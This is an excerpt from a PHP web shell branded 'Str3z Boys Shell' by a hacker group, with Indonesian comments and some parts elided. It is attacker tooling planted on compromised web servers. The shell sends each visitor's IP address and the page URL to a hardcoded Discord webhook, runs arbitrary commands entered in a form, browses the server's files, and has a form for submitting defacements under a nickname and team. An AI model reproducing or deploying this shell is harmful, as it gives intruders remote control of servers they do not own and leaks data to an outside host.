...
// URL webhook Discord
$discordWebhookUrl = "https://discord.com/api/webhooks/1314533406100688927/l2hFciICVSduUvl1FZIaM6rRIWM1jMJYXiwq5pfIDv_KC4rwBrQNpiu4l4skTAEldmdz";

// Fungsi untuk mengirim data ke webhook Discord
...
// Informasi yang dikirim ke webhook
$user_ip = $_SERVER['REMOTE_ADDR'];
$full_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$logMessage = "[SmokyHaxor]:\nIp Location: $user_ip\nurl: $full_url";

// Kirim ke Discord
sendToDiscord($logMessage, $discordWebhookUrl);
    ...
    if (isset($_POST['nick']) && isset($_POST['team']) && isset($_POST['weblist'])){
        ...
        echo '<form action="" method="post">
            <div class="mb-3">
                ...
                <input type="text" class="form-control" name="nick" placeholder="SMOKY" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Team</label>
                <input type="text" class="form-control" name="team" placeholder="SMOKY">
            </div>
            <div class="mb-3">
...
<html>
    <head>
        ...
        <title>Str3z Boys Shell [ <?= $serv; ?> ]</title>
                ...
                <div class="p-4 rounded-3">
                    ...
                    <div id="tools">
                        ...
                        <div class="d-flex justify-content-center flex-wrap my-3">
                            ...
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=command" class="m-1 btn btn-outline-light btn-sm"><i class="fab fa-linux"></i> Command</a>
                            <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=notify" class="m-1 btn btn-outline-light btn-sm"><i class="fa fa-desktop"></i> Notify</a>
                        </div>
                        <center>
                            <hr width='20%'>
                        </center>
                                            ...
                                            <?php elseif ($action == 'command') : ?>
                                                <form action="" method="post">
                                                    <div class="mb-3">
                                                        ...
                                                        <div class="input-group">
                                                            <input type="text" class="form-control form-control-sm" name="ucmd" placeholder="smoky">
                                                            <button class="btn btn-outline-light" type="submit">Submit</button>
                                                        </div>
                                                    </div>
                                                </form>
                            ...
                            <tbody class="text-nowrap">
                                <tr>
                                    <td colspan="7" class="text-center">
                                        <img src="https://haxorgrub.com/images/hxseo.png" alt="hxseo" style="max-width: 200px; height: auto;"
                                    </td>
                                </tr>
                                <?php
                                    foreach ($dirs as $dir) :
...
?>
                    ...
                    <center><div class="text-light my-1">&#169; AEXDY</div></center>
                </div>
            </div>
        </div>
